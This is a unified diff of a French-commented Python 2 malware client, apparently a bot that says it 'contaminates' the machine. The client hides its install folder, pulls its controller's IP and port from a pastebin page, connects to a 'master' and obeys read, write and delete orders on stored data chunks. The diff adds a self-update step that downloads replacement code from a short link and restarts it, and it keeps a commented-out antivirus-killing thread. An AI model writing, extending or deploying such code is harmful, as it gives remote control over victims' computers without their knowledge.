@@ -19,9 +19,9 @@ if sys.platform == "win32" : import _winreg
 import shutil
 import socket
 import threading
+import urllib
 from time import sleep
 from random import randint
-from urllib import urlopen
 
 
 class CacahueteError(Exception):
@@ -51,7 +51,12 @@ def installation() :
 	Fonction contaminant imediatement le système
 	"""
 	# On crée le répertoire principal
-	os.mkdir(rep_install)
+	try :
+		os.mkdir(rep_install)
+	except Exception, e :
+		print(e)
+		sys.exit(1)
+	
 	if sys.platform == "win32" : os.system("attrib +h " + rep_install)
 	
 	# On crée le répertoire de stockage des chunks
@@ -75,6 +80,26 @@ def installation() :
 	
 	print(u"Machine contaminée.")
 
+
+def get_conf(pastebin_key) :
+	"""
+	Fnction récupèrant les parametres à partir deu pastebin
+	"""
+	page = urllib.urlopen(pastebin_api_read + pastebin_key)
+	
+	# On parcours chaque ligne du pastebin
+	for ligne in page :
+		
+		# On ne prend pas en compte les commentaire
+		if ligne.startswith('#') : continue
+		
+		# On met notre parametre en dictionnaire
+		variable,valeur = ligne.strip(' \r\n').split('=')
+		if valeur.isdigit() : valeur = int(valeur)
+		conf[variable] = valeur
+	
+	return conf
+	
 
 def def_rep_install() :
 	"""
@@ -100,7 +125,7 @@ def def_paire_id() :
 			paire_id = int(fichier_paire_id.readline().strip("\n"))
 	
 	except IOError :
-		paire_id = randint(1, 2**24)
+		paire_id = randint(1, 2**100)
 		with open(os.path.join(rep_install, nom_client_id), 'w') as fichier_paire_id :
 			fichier_paire_id.write(str(paire_id))
 	
@@ -120,6 +145,8 @@ def read(requete) :
 	
 	if rep == reponse :
 		print(u"Le chunk {0} de {1} octets a été envoyé".format(chunk_id[:10], len(chunk_data)))
+	else :
+		print(u"Le chunk {0} a été mal envoyé".format(chunk_id[:10], len(chunk_data)))
 
 
 def write(requete) :
@@ -129,9 +156,15 @@ def write(requete) :
 	# Ici les octets restants de la requête correspondent au chunk_id concerné par l'ordre
 	chunk_id = requete[1:]
 	chunk_data = s.recv(chunk_taille)
-	with open(os.path.join(rep_install, rep_data, chunk_id),'w') as chunk : chunk.write(chunk_data)
-	s.send(reponse)
-	print(u"Le chunk {0} de {1} octets a été réceptionné".format(chunk_id[:10], len(chunk_data)))
+	
+	if len(chunk_data) == chunk_taille :
+		s.send(reponse)
+		print(u"Le chunk {0} de {1} octets a été réceptionné".format(chunk_id[:10], len(chunk_data)))
+		with open(os.path.join(rep_install, rep_data, chunk_id),'w') as chunk :
+			chunk.write(chunk_data)
+	else :
+		s.send("er")
+		print(u"Le chunk {0} a été mal réceptionné".format(chunk_id[:10], len(chunk_data)))
 
 
 def delete(requete) :
@@ -140,9 +173,10 @@ def delete(requete) :
 	"""
 	# Ici les octets restants de la requête correspondent au chunk_id concerné par l'ordre
 	chunk_id = requete[1:]
-	s.send(reponse)
 	try : os.remove(os.path.join(rep_install, rep_data, chunk_id))
 	except OSError : pass
+	
+	s.send(reponse)
 	print(u"Le chunk {0} a été supprimé.".format(chunk_id[:10]))
 
 
@@ -154,33 +188,26 @@ def echo() :
 	s.send(reponse)
 
 
-def maj(requete) :
+def maj() :
 	"""
-	
+	Fonction téléchargent et écrasant le logiciel par la nouvelle version
 	"""
-	# Ici les octets restants de la requête correspondent à la taille de la mise à jour avec des espaces de bourrage
-	fichier_len = int(requete[1:].strip())
-	
-	fichier_data = s.recv(fichier_len)
-	with open(os.path.join(rep_install, nom_client), 'w') as fichier :
-		fichier.write(fichier_data)
+	# Téléchargement de la mise à jour
+	urllib.urlretrieve(url_maj, os.path.join(rep_install, nom_client))
 	print(u"La mise à jour a été faite")
-	s.send(reponse)
 	
 	# On relance le client proprement
-	s.close()
-	sleep(echo_duree*2)
 	os.remove(os.path.join(rep_install, nom_client_lock))
 	restart()
 	sys.exit(0)
 
 
 """ Fonction de déboguage, ne pas y faire attention... """
-i = 1
+iii = 1
 def DEBOGUE(nom_variable, variable) :
-	global i
-	print("\033[31mdébogue {0} : {1} {2} = {3}\033[0m".format(i, nom_variable, type(variable), variable))
-	i += 1
+	global iii
+	print(u"débogue {0} : {1} {2} = {3}".format(iii, nom_variable, type(variable), variable))
+	iii += 1
 """ ...merci """
 
 ################################################################################
@@ -216,18 +243,23 @@ rep_courant = os.path.abspath(os.path.dirname(sys.argv[0]))
 rep_data = "data/"
 rep_install = def_rep_install()
 
-api_read = "http://pastebin.com/raw.php?i="
-paste_key = "4KT5y5Ex"
-paire_version = 0.5
+pastebin_api_read = "http://pastebin.com/raw.php?i="
+pastebin_key = "kzeJRig7"
+url_version = "http://db.tt/0QDhBdhm"
+url_maj = "http://db.tt/a0UfGCCW"
+version_paire = 0.4
+version_courante = float(urllib.urlopen(url_version).readline().strip(' \n'))
 
 dict_ordre = {
 	"read":"r",
 	"write":"w",
 	"delete":"-",
 	"echo":"?",
-	"maj":"%",
-	"quit":"q",
+	"quit":"q"
 	}
+
+# Variables
+conf = {}
 
 # Tests avant de démarrer
 if rep_courant == rep_install :
@@ -243,44 +275,40 @@ else :
 	restart()
 	sys.exit(1)
 
-# On crée un vérrou mono-instance
-open(os.path.join(rep_install, nom_client_lock), 'w')
+# On vérifier s'il faut metre à jour
+if version_courante < version_paire : maj()
 
-# On lance un thread qui tuera l'antivirus
-"""
-service = threading.Thread(target=kill_av)
-service.setDaemon(True)
-service.start()
-"""
-
-# On lit ou génère notre paire_id
-paire_id = def_paire_id()
-
-# Début
 try :
+	# On crée un vérrou mono-instance
+	open(os.path.join(rep_install, nom_client_lock), 'w')
+
+	# On lance un thread qui tuera l'antivirus
+	"""
+	service = threading.Thread(target=kill_av)
+	service.setDaemon(True)
+	service.start()
+	"""
+
+	# On lit ou génère notre paire_id
+	conf["paire_id"] = def_paire_id()
+
+	# Début
 	connexion = False
 	while 1 :
 		try :
 			# Si la connexion n'a pas encore été faite (ou à été coupée)
-			if connexion == False :
+			if not connexion :
 				
-				# On récupère les parametres du master sur pastebin.com
-				page = urlopen(api_read + paste_key)
-				adresse = page.readline().strip(" \n")
-				port = int(page.readline().strip(" \n"))
-
-				# On ouvre une socket TCP (locale) et on connecte la socket au serveur
+				# On récupère les parametres
+				conf = get_conf(pastebin_key)
+				
+				# On ouvre une socket TCP (locale) et on la connecte au serveur
 				print(u"Tentative de connexion au master.")
-				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-				s.connect((adresse,port))
+				s = socket.socket()
+				s.connect((conf["ip"],conf["port"]))
 				
-				# On envoie notre identifiant et notre version
-				s.send("{0} {1}".format(paire_id, paire_version))
-				
-				# On receptionne les parametres
-				reponse = s.recv(32).strip()
-				chunk_taille = int(s.recv(32).strip())
-				echo_duree = int(s.recv(32).strip())
+				# On envoie notre identifiant
+				s.send(str(conf["paire_id"]))
 				
 				# On indique que la connexion à été faite
 				connexion = True
@@ -288,28 +316,26 @@ try :
 			# On attend que le Master veuille quelque chose
 			print(u"Attente d'ordre venant du master...")
 			requete = s.recv(1+64)
+			DEBOGUE("requete", requete)
 			
 			# On ne poursuit pas si la requête n'est pas formée de caractères alpha-numériques
-			if not requete.isalnum : continue
+			if not requete.isalnum() : continue
 			
 			# Le premier octet de la requête correspond toujours à l'ordre que le Master veux qu'on réalise
 			ordre = requete[:1]
 			
 			# "r" pour le download d'un chunk
 			if ordre == dict_ordre["read"] : read(requete)
-		
+			
 			# "w" pour la création d'un nouveau chunk
 			elif ordre == dict_ordre["write"] : write(requete)
-		
+			
 			# "-" pour la suppression d'un chunk
 			elif ordre == dict_ordre["delete"] : delete(requete)
 			
 			# "?" pour renvoyer notre écho
 			elif ordre == dict_ordre["echo"] : echo()
-				
-			# "%" pour la mise à jour
-			elif ordre == dict_ordre["maj"] : maj(requete)
-				
+			
 			# "q" pour nous dire que le master va couper
 			elif ordre == dict_ordre["quit"] : s.close()
 			
@@ -317,12 +343,12 @@ try :
 			else : raise CacahueteError
 		
 		except socket.error :
-			sleep(5)
 			connexion = False
+			sleep(5)
 		
 		except CacahueteError :
-			sleep(5)
 			connexion = False
+			sleep(5)
 	
 	# Pour le principe
 	sys.exit(0)
